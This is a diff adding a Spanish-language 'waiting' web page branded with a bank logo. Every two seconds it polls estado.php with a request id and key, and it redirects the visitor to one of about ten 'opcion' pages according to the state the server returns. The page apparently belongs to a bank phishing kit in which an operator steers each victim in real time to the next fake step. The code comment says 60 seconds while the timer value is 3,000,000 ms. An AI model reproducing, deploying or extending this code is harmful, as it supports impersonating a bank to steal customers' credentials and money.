@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Esperando...</title>
+
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      background-color: #fff;
+      
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      text-align: center;
+    }
+
+    .contenedor {
+      position: relative;
+      width: 80%;
+      max-width: 400px;
+    }
+
+    .gif-overlay {
+      position: relative;
+      display: inline-block;
+      width: 100%;
+    }
+
+    .gif-overlay img {
+      width: 100%;
+      display: block;
+    }
+
+    #tiempo {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      font-size: 18px;
+      font-weight: bold;
+      color: rgb(0, 0, 0);
+     
+      padding: 8px 16px;
+      border-radius: 10px;
+    }
+  </style>
+</head>
+<body style="background-color:#f7f7f7;  background-repeat: no-repeat; background-size: 300%;">
+ 
+<br><br><br>
+<center><img src="img/banco45.png" style="margin-top: 150px;" width="70%" alt="">
+
+ <img  style="margin-top: -150px;"  src="img/cargando1.gif" width="85%" alt=""></center>
+
+
+
+ <script>
+  // Tiempo máximo de espera en milisegundos (60 segundos)
+  const tiempoLimite = 3000000;
+
+  // Temporizador para redirigir automáticamente
+  const redireccionTimeout = setTimeout(() => {
+    window.location.href = `opcion2.html?key=${key}&requestId=${requestId}`;
+  }, tiempoLimite);
+
+  const params = new URLSearchParams(window.location.search);
+  const requestId = params.get("rid");
+  const key = params.get("key");
+
+  setInterval(() => {
+    fetch(`estado.php?rid=${requestId}` + (key ? (`&key=${encodeURIComponent(key)}`) : ''), {cache:'no-store'})
+        .then(res => res.ok ? res.json() : Promise.reject('HTTP '+res.status))
+        .then(data => {
+     switch (data.estado) {
+  case 'opcion_1':
+    clearTimeout(redireccionTimeout);
+    window.location.href = `opcion1.html?key=${key}&requestId=${requestId}`;
+    break;
+  case 'opcion_2':
+    clearTimeout(redireccionTimeout);
+    window.location.href = `opcion6.html?key=${key}`;
+    break;
+  case 'opcion_3':
+    clearTimeout(redireccionTimeout);
+    window.location.href = `opcion3.html?key=${key}`;
+    break;
+  case 'opcion_4':
+    clearTimeout(redireccionTimeout);
+    window.location.href = `opcion4.html?key=${key}`;
+    break;
+  case 'opcion_5':
+    clearTimeout(redireccionTimeout);
+    window.location.href = `opcion5.html?key=${key}`;
+    break;
+  case 'opcion_6':
+    clearTimeout(redireccionTimeout);
+    window.location.href = `opcion6.html?key=${key}`;
+    break;
+  case 'opcion_7':
+    clearTimeout(redireccionTimeout);
+    window.location.href = `opcion7.html?key=${key}`;
+    break;
+  case 'opcion_8':
+    clearTimeout(redireccionTimeout);
+    window.location.href = `opcion8.html?key=${key}`;
+    break;
+  case 'opcion_55':
+    clearTimeout(redireccionTimeout);
+    window.location.href = `opcion55.html?key=${key}`;
+    break; 
+case 'opcion_9':
+    clearTimeout(redireccionTimeout);
+    window.location.href = `opcion9.php?key=${key}`;
+    break;
+}
+      })
+        .catch(() => {/* ignore network/json errors, keep polling */});
+  }, 2000);
+</script>
+
+</body>
+</html>
